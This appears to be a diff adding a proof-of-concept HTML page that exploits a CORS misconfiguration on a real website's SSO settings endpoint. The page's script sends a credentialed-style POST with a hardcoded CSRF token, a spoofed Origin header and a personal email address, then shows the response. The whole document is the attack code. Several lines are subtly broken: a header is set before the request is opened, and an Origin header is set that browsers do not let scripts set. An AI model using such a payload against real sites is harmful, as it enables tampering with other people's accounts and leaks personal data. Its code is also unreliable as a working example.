@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h2>CORS POC Exploit</h2>
+<h3>Extract SID</h3>
+ 
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.setRequestHeader("X-CSRF-Token", "PHFAiKLZzxGwK5ARGt9vPfY8L_hNSaeXLG998FIWBRMbV8iF8JzRdw2i0N3ZpWDXsq8Oy77BFviJTEePH6uqVg");
+  xhttp.setRequestHeader("Origin", "https://evil.datacamp.com");
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = alert(this.responseText);
+    }
+  };
+ // xhttp.open("GET", "https://www.datacamp.com/users/sso-settings", true);
+//  xhttp.withCredentials = true;
+//  xhttp.send();
+  xhttp.open("POST", "https://www.datacamp.com/users/sso-settings", true);
+  xhttp.setRequestHeader("Content-type", "application/json, text/javascript, */*; q=0.01");
+  xhttp.send('{"email":"viraj1024.1024@gmail.com"}');
+}
+</script>
+ 
+</body>
+</html>
